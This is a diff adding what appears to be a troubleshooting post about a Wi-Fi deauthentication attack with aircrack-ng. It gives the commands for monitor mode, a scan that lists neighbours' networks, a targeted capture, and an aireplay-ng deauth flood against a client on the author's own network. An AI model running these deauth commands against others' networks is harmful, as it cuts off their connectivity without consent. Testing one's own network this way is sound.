@@ -1,0 +1,40 @@
+>> ifconfig wlan0 down
+>> airmon-ng check kill
+>> ifconfig wlan0 up
+>> iwconfig wlan0 mode monitor
+>> airodump-ng wlan0 
+
+# At this stage I get all the wifi near me 
+[CH  9 ][ Elapsed: 0 s ][ 2021-04-19 13:35                                                                                                          
+                                                                                                                                                    
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                    
+                                                                                                                                                    
+ 24:0B:88:33:DD:B9  -85        9        0    0   5  130   WPA2 CCMP   PSK  Mandeep                                                                  
+ 30:E9:8E:AE:BF:D8  -83        5        0    0   1  130   WPA2 CCMP   PSK  Jass Cable                                                               
+ 98:86:9D:5E:25:C9  -48       23        1    0  14  130   WPA2 CCMP   PSK  Gurdass             
+ 
+ I choose Gurdass which is mine!!
+ 
+ >> airodump-ng --bssid 98:86:9D:5E:25:C9 --channel 14 wlan0 
+                                                                                                                                                    
+ [CH 13 ][ Elapsed: 0 s ][ 2021-04-19 13:38                                                                                                          
+                                                                                                                                                    
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                
+                                                                                                                                                    
+ 98:86:9D:5E:25:C9   15 100       53        4    0  13  130   WPA2 CCMP   PSK  Gurdass                                                              
+                                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                                  
+                                                                                                                                                    
+                                                                                 
+ 98:86:9D:5E:25:C9  5C:99:60:79:79:FD   -7    1e-24    470       46                                                                                 
+                                                                                 
+Quitting...
+ 
+Then I run both the commands... the above one first: airodump-ng --bssid 98:86:9D:5E:25:C9 --channel 14 wlan0 then I run this command : 
+This one: 
+>> aireplay-ng --deauth 10000 -a 98:86:9D:5E:25:C9 -c 5C:99:60:79:79:FD wlan0
+
+This Process doesn't give me any kind of error...instead this work properly but this was not able to dissconnect my mobile from wifi!! I was so confused...
+
+
+<b> if you want any other things then please me!! </b>
